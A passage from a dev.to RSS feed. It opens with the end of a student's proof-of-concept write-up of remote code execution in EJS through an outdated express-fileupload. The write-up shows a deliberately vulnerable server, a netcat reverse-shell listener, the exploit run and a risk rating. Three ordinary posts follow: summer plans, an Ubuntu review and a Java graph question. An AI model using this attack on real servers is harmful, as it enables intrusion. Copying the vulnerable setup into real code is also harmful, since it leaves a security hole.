&lt;/div&gt;



&lt;p&gt;This installs all needed libraries and dependencies including EJS. A "node_modules" folder should appear.&lt;/p&gt;

&lt;p&gt;Now, write the server code &lt;strong&gt;server.js&lt;/strong&gt;&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight javascript"&gt;&lt;code&gt;&lt;span class="c1"&gt;// web server code&lt;/span&gt;
&lt;span class="c1"&gt;// website starts here&lt;/span&gt;

&lt;span class="c1"&gt;// imports&lt;/span&gt;
&lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;express&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;require&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;express&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;fileupload&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;require&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;express-fileupload&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;http&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;require&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;http&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;app&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;express&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;

&lt;span class="nx"&gt;app&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;use&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;fileupload&lt;/span&gt;&lt;span class="p"&gt;({&lt;/span&gt; &lt;span class="na"&gt;parseNested&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="kc"&gt;true&lt;/span&gt; &lt;span class="p"&gt;}));&lt;/span&gt;
&lt;span class="c1"&gt;// set the view engine to ejs&lt;/span&gt;
&lt;span class="nx"&gt;app&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="kd"&gt;set&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;view engine&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;ejs&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="nx"&gt;app&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="kd"&gt;set&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;views&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;../frontend/pages&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;

&lt;span class="nx"&gt;app&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="kd"&gt;get&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;/&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;req&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;res&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
   &lt;span class="nx"&gt;res&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;render&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;index&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;});&lt;/span&gt;



&lt;span class="c1"&gt;// sever starting ...&lt;/span&gt;
&lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;server&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;http&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;Server&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;app&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;addr&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;192.168.98.10&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;
&lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;port&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;8080&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="nx"&gt;server&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;listen&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;port&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;addr&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="nx"&gt;console&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;log&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;Server listening on &lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="nx"&gt;addr&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt; port &lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="nx"&gt;port&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
 &lt;span class="p"&gt;});&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;You'll need to change the "addr" variable in line 24 to match your victim machine's IP address.&lt;/p&gt;

&lt;p&gt;Next, create a simple HTML page in frontend/pages. It needs to be an .ejs file. I created a very plain one &lt;strong&gt;index.ejs&lt;/strong&gt;. This is to show that this attack does not require the victim to click anything on the website. The vulnerability lies in an outdated dependency used. No XSS needed. I probably don't need to show the code but here it is lol.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight html"&gt;&lt;code&gt;&lt;span class="cp"&gt;&amp;lt;!DOCTYPE html&amp;gt;&lt;/span&gt;
&lt;span class="nt"&gt;&amp;lt;html&amp;gt;&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;lt;head&amp;gt;&lt;/span&gt;
        &lt;span class="nt"&gt;&amp;lt;title&amp;gt;&lt;/span&gt;Some Website&lt;span class="nt"&gt;&amp;lt;/title&amp;gt;&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;lt;/head&amp;gt;&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;lt;body&amp;gt;&lt;/span&gt;
        &lt;span class="nt"&gt;&amp;lt;h1&amp;gt;&lt;/span&gt;This is some website&lt;span class="nt"&gt;&amp;lt;/h1&amp;gt;&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;lt;/body&amp;gt;&lt;/span&gt;
&lt;span class="nt"&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;&lt;a href="#contents"&gt;🚀 back to contents&lt;/a&gt;&lt;/p&gt;

&lt;h1&gt;
  &lt;a href="#launch-attack"&gt;
  &lt;/a&gt;
  Launch Attack &lt;a&gt;&lt;/a&gt;
&lt;/h1&gt;

&lt;p&gt;With everything set up, you can finally launch the attack. First, start the web server from the victim machine. Run npm start in the backend directory where the server.js file is located.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--gjvBnZh1--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://raw.githubusercontent.com/boiledsteak/EJS-Exploit/main/screenshots/start-webserver.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--gjvBnZh1--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://raw.githubusercontent.com/boiledsteak/EJS-Exploit/main/screenshots/start-webserver.png" alt="screenshot of npm start"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Now on the attacker side start a nc to listen for a connection from the victim.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight shell"&gt;&lt;code&gt;nc &lt;span class="nt"&gt;-lvp&lt;/span&gt; 8020
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Then start the actual exploit&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight shell"&gt;&lt;code&gt;python3 EJS-RCE-attack.py
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--YGUQ14ZN--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://raw.githubusercontent.com/boiledsteak/EJS-Exploit/main/screenshots/attacker-exploiting.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--YGUQ14ZN--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://raw.githubusercontent.com/boiledsteak/EJS-Exploit/main/screenshots/attacker-exploiting.png" alt="screenshot of terminal"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;If everything is done properly, you should be seeing a shell of the victim, on the attacker's terminal. From here you can do all kinds of commands to demonstrate RCE. You could do a simple DOS by restarting the machine with init 6. Or maybe do something even more 'hackerman' by downloading a MSFvenom and opening a metasploit shell.&lt;/p&gt;

&lt;p&gt;That's all to the attack. It's actually very simple. As I said at the start, this is just a simple RCE POC to show that misconfiguration can lead to severe vulnerabilities. The victim doesn't even need to click anything on the website and yet the web server can be compromised.&lt;/p&gt;

&lt;p&gt;&lt;a href="#contents"&gt;🚀 back to contents&lt;/a&gt;&lt;/p&gt;

&lt;h1&gt;
  &lt;a href="#risk"&gt;
  &lt;/a&gt;
  Risk &lt;a&gt;&lt;/a&gt;
&lt;/h1&gt;

&lt;p&gt;As defined by the &lt;a href="https://owasp.org/www-project-risk-assessment-framework/"&gt;OWASP risk rating methodology&lt;/a&gt;, the risk of a vulnerability is measured by its likelihood and impact.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#likelihood"&gt;
  &lt;/a&gt;
  Likelihood &lt;a&gt;&lt;/a&gt;
&lt;/h2&gt;

&lt;p&gt;The likelihood of this exploit happening is extremely low because it relies on an outdated version of express-fileupload. The github repo that maintains this dependency even has a security warning about this exploit. Moreover EJS is not usually used in production. React, Angular , Vue, these are some of the more popular javascript frontend frameworks. EJS is used more for learning and development.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Thus I would give this a Low likelihood rating of 1/3&lt;/strong&gt;&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#impact"&gt;
  &lt;/a&gt;
  Impact &lt;a&gt;&lt;/a&gt;
&lt;/h2&gt;

&lt;p&gt;Since this is a RCE exploit, the impact is very high. RCE can enable all sorts of attacks. Stealing data, denial of service, opening backdoors, lateral movement - these are to name of but a few. Of course there are many effective ways to mitigate the impact of RCE such as firewalls, giving least privelege, port blocking etc. however the impact is still high.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Thus I would give this a High impact rating of 3/3&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;With low likelihood and high impact, I rate this exploit as a &lt;strong&gt;Medium Risk&lt;/strong&gt;&lt;br&gt;
&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--oDtAqcrB--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://raw.githubusercontent.com/boiledsteak/EJS-Exploit/main/screenshots/risk-rating.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--oDtAqcrB--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://raw.githubusercontent.com/boiledsteak/EJS-Exploit/main/screenshots/risk-rating.png" alt="risk rating"&gt;&lt;/a&gt;&lt;br&gt;
&lt;a href="#contents"&gt;🚀 back to contents&lt;/a&gt;&lt;/p&gt;

&lt;h1&gt;
  &lt;a href="#thats-it"&gt;
  &lt;/a&gt;
  That's it!
&lt;/h1&gt;

&lt;p&gt;Thank you for reading my first post :) Yes I know it's a very simple and amateur exploit but I hope someone finds it useful. I'm just a student with no real professional experience so some of my information may even be false or misinformed. Please let me know if I missed anything. You can read more about javascript prototype pollution to understand deeper why this vulnerability even exists. &lt;/p&gt;

</description>
      <category>node</category>
      <category>security</category>
      <category>webdev</category>
    </item>
    <item>
      <title>Summer Plans of a Freshman CS student</title>
      <author>Firangiz Ganbarli</author>
      <pubDate>Sat, 05 Jun 2021 11:13:49 +0000</pubDate>
      <link>https://dev.to/firangizg/summer-plans-of-a-freshman-cs-student-1p68</link>
      <guid>https://dev.to/firangizg/summer-plans-of-a-freshman-cs-student-1p68</guid>
      <description>&lt;p&gt;Hey everyone! &lt;/p&gt;

&lt;p&gt;As summer months have started, and I have had a sufficient break after university, I was planning on how to spend my summer efficiently since I will be applying for internships in Summer 2022.&lt;/p&gt;

&lt;p&gt;My freshman year as a Computer Engineering student has ended and by the end of the summer, I will start my applications, so most of the tasks I will try to accomplish by the end of summer will be geared towards that. &lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#1-learn-python"&gt;
  &lt;/a&gt;
  1. Learn Python
&lt;/h3&gt;

&lt;p&gt;I have been learning Python inefficiently for a long time and think that this free time during the summer could be used efficiently to learn the fundamentals of Python properly. To do this, I am still searching for good resources but as of now I am planning to follow the interactive textbook of &lt;a href="https://runestone.academy/runestone/books/published/thinkcspy/index.html"&gt;How to Think Like a Computer Scientist&lt;/a&gt;. Comment down below if you have any other good resources to learn Python well!&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#2-build-side-projects"&gt;
  &lt;/a&gt;
  2. Build Side Projects
&lt;/h3&gt;

&lt;p&gt;While I have doing small "tutorial" projects like Madlibs or Rock,Paper,Scissors as an exercise, I actually want to do two proper side projects and finish it by the end of the summer. I do not need them to be technically complex, but rather, quality side projects that people would actually use. If you have any ideas of nice side projects that let me learn well, I am open to suggestions!&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#3-finish-cracking-the-coding-interview-book"&gt;
  &lt;/a&gt;
  3. Finish Cracking the Coding Interview Book
&lt;/h3&gt;

&lt;p&gt;Since I have not taken a Data Structures and Algorithms class in university yet, I am a bit behind on the content of programming interviews so I need to read up on the fundamental data structures and algorithms. I have already started reading &lt;a href="https://www.amazon.com/Cracking-Coding-Interview-Programming-Questions/dp/0984782850/ref=sr_1_1?dchild=1&amp;amp;gclid=Cj0KCQjwweyFBhDvARIsAA67M71hTdYS-xEQp2C9nSDMrOjcHXawDm9KaBzig0yXWXPR7yBuc_PPQQEaAq9VEALw_wcB&amp;amp;hvadid=241870593966&amp;amp;hvdev=c&amp;amp;hvlocint=1017537&amp;amp;hvlocphy=1000998&amp;amp;hvnetw=g&amp;amp;hvqmt=e&amp;amp;hvrand=784618840862712783&amp;amp;hvtargid=kwd-20040243067&amp;amp;hydadcr=16409_10304044&amp;amp;keywords=cracking+the+coding+interview&amp;amp;qid=1622891243&amp;amp;sr=8-1"&gt;Cracking the Coding Interview Book&lt;/a&gt; and it is very useful. Hopefully, by the end of the summer I have mastered enough of the topics on the book. &lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#4-grind-some-leetcode-questions"&gt;
  &lt;/a&gt;
  4. Grind some Leetcode questions
&lt;/h3&gt;

&lt;p&gt;This goes along with plan number 3. While the book is great for learning and also doing the exercises help, I need more practice with questions that will be similar to the interviews I will potentially do. I have compared several practice websites, and I also do not want to keep searching and comparing which website is the best to use, so I will do the questions in Leetcode even though I am struggling with easy questions right now. &lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#5-attend-hackathons"&gt;
  &lt;/a&gt;
  5. Attend hackathons
&lt;/h3&gt;

&lt;p&gt;I love hackathons, the entrepreneurial and innovative spirit of hackathons excite me. And I am most innovative when working with other people, so I will attend virtual hackathons over the summer and hopefully make nice projects (maybe even win some, but that is definitely not the point). &lt;/p&gt;

&lt;p&gt;Well, these are my plans for this summer. Hopefully that was a fun and insightful read. &lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;em&gt;What are your plans for this summer? If you are working/have an internship, how is it going?&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;

</description>
      <category>programming</category>
      <category>career</category>
      <category>productivity</category>
      <category>beginners</category>
    </item>
    <item>
      <title>Review of Ubuntu after 4 months of daily usage </title>
      <author>krishna kakade</author>
      <pubDate>Sat, 05 Jun 2021 11:11:14 +0000</pubDate>
      <link>https://dev.to/krishnakakade/review-of-ubuntu-after-4-months-of-daily-usage-3815</link>
      <guid>https://dev.to/krishnakakade/review-of-ubuntu-after-4-months-of-daily-usage-3815</guid>
      <description>&lt;p&gt;hello all In this article &lt;br&gt;
I will explain of experience of ubuntu after 4 months of daily heavy usage.&lt;br&gt;
Firstly this my first-time regular usage of ubuntu firstly I am a windows guy but I have tried ubuntu a couple of times but not heavy regular usage so in this article I will pros and cons of ubuntu and also the problems I face and how I solved those things.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Overall UI(User Experience) review&lt;/strong&gt; &lt;br&gt;
Transitioning to ubuntu after using windows more than 3 years of regular usage firstly I am excited for the change new ecosystem I didn't find any flaws or complications in UI of Ubuntu 20.04 infact Ubuntu feels like Mac OS to me that is kind of cool thing now question arises what if there is UI freeze kind of thing &lt;br&gt;
&lt;strong&gt;how I am tackling with UI issues&lt;/strong&gt;&lt;br&gt;
In case of windows my laptop is used to show 100% disk usage and because of that my laptop used to freeze daily so then I have to do restart again and again and I having pretty much good hardware 16gigs of RAM 2 TB hdd but I don't have ssd:( Now in case of Ubuntu as a primary operating system it's been four months now hardly my UI doc and overall UI freezed less than 5 times and if that happens like user interface not responding then simple fix for that is &lt;strong&gt;ALT +F2&lt;/strong&gt; and just type &lt;strong&gt;r&lt;/strong&gt; in that box and it's done issue solved 💪😄👌 sounds cool right but it feels better than sounds cool 😊 so no major issues with UI everything works fine. &lt;br&gt;
&lt;strong&gt;So-called command syndrome&lt;/strong&gt;&lt;br&gt;
Most developers/users think ubuntu is hard to use no that is the myth of the group of folks because as we need to install apps/programs in ubuntu manually but there thousand of resources available on the internet like if need to install vscode or lmms there is installation command guide available for that. so installing and removing the program is not big task.&lt;br&gt;
and all development thing works fine and no worries with that every App that developer need that is available in linux.&lt;br&gt;
Problems for that i didn't got good solution for &lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;react native installation doesn't work&lt;/li&gt;
&lt;li&gt;some times music breaks not always once in while.
*&lt;em&gt;Only thing i miss in this OS is playing games i tried epic games through lutris but didn't worked that is only sad other thing smooth like butter *&lt;/em&gt;
That's it for this one .
thank you for reading :)
Should you switch to linux 
&lt;img src="https://i.giphy.com/media/JoPrI0tpxDhX7f7iPl/giphy.gif" alt="gify"&gt;
&lt;/li&gt;
&lt;/ul&gt;

</description>
    </item>
    <item>
      <title>Trying to understand Adjacency Matrix Representation of an Graph</title>
      <author>ganeshkulkarni123</author>
      <pubDate>Sat, 05 Jun 2021 10:33:26 +0000</pubDate>
      <link>https://dev.to/ganeshkulkarni123/trying-to-understand-adjacency-matrix-representation-of-an-graph-18fn</link>
      <guid>https://dev.to/ganeshkulkarni123/trying-to-understand-adjacency-matrix-representation-of-an-graph-18fn</guid>
      <description>&lt;p&gt;Hi trying to understand toString method from the following code, It's clear to me that to represent graph in string format we 're iterating through vertex and array, but what's logic behind it? How it's exactly working? Any help would be appreciated&lt;br&gt;
: public class AdjMatrixGraph {&lt;/p&gt;

&lt;p&gt;private int V; // number of vertices in Graph&lt;br&gt;
    private int E; // number of edges in Graph&lt;br&gt;
    private int[][] adjMatrix;&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;public AdjMatrixGraph(int nodes) {
    this.V = nodes;
    this.E = 0;
    this.adjMatrix = new int[nodes][nodes];
}

public void addEdge(int u, int v) {
    adjMatrix[u][v] = 1;
    adjMatrix[v][u] = 1; // because it is an undirected graph
    E++;
}

public String toString() {
    StringBuilder sb = new StringBuilder();
    sb.append(V + " vertices, " + E + " edges " + "\n");
    for(int v = 0; v &amp;lt; V; v++) {
        sb.append(v + ": ");
        for(int w : adjMatrix[v]) {
            sb.append(w + " ");
        }
        sb.append("\n");
    }
    return sb.toString();
}

public static void main(String[] args) {
    AdjMatrixGraph g = new AdjMatrixGraph(4);
    g.addEdge(0, 1);
    g.addEdge(1, 2);
    g.addEdge(2, 3);
    g.addEdge(3, 0);
    System.out.println(g);
}
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;

&lt;p&gt;}&lt;/p&gt;

</description>
      <category>java</category>
      <category>algorithms</category>
    </item>
  </channel>
</rss>
